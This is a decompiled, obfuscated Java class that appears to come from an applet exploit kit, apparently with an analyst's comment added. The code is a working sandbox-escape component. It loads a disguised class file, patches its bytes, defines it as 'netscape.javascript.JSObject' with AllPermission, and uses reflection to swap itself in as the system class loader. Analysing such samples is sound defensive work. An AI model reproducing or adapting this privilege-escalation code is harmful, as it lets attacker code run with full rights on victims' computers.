package app;

import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.net.URLConnection;
import java.security.AllPermission;
import java.security.CodeSource;
import java.security.Permissions;
import java.security.ProtectionDomain;
import java.security.cert.Certificate;

final class Class_e
		extends ClassLoader
{
	private static ClassLoader _classLoader;
	private static Class_e var_7fd;
	private static Class var_805;

	@Override public final Class loadClass(String name) throws ClassNotFoundException {
		ProtectionDomain protectionDomain = null;

		if (name.equals("netscape.javascript.JSObject")) {
			CodeSource codeSource = new CodeSource(null, (Certificate[])null);
			Permissions permissions = new Permissions();
			permissions.add(new AllPermission());
			protectionDomain = new ProtectionDomain(codeSource, permissions);
		}

		try {
			URL url = super.getClass().getClassLoader().getResource("netscape/javascript/JSObjec_.class");
			URLConnection urlConnection = url.openConnection();
			InputStream inputStream = urlConnection.getInputStream();

			byte[] classData = new byte[urlConnection.getContentLength()];
			int i = 0;
			while (i < classData.length) {
				i += inputStream.read(classData, i, classData.length -i);
			}

			// wtf is dis i don even
			for (int j = 0; j < classData.length; j++) {
				if (classData[j] == "JSObject".charAt(0)) {
					for (int l = 1; j + l < classData.length; l++) {
						if (l == "JSObject".length() - 1) {
							classData[j + l] = (byte)"JSObject".charAt(l);
						}
						if (classData[j + l] != "JSObject".charAt(l)) {
							break;
						}
					}
				}
			}

			return defineClass(name, classData, 0, classData.length, protectionDomain);
		} catch (IOException ex) {
			ex.printStackTrace();
			try {
				return super.getClass().getClassLoader().loadClass(name);
			} catch (Exception innerEx) {
			}
		}

		return _classLoader.loadClass(name);
	}

	private final void sub_a54() {
		try {
			_classLoader = ClassLoader.getSystemClassLoader();

			Field field = (var_805 == null ? (Class_e.var_805 = getClassFromName("java.lang.ClassLoader")) : var_805).getDeclaredField("scl");
			field.setAccessible(true);
			field.set(_classLoader, this);
			field.setAccessible(false);
		} catch (Throwable ex) {
		}
	}

	static final void sub_ae5() {
		var_7fd = new Class_e();
		var_7fd.sub_a54();
	}

	private static Class getClassFromName(String className) throws Throwable {
		try {
			return Class.forName(className);
		} catch (ClassNotFoundException ex) {
			throw new NoClassDefFoundError().initCause(ex);
		}
	}

} //class Class_e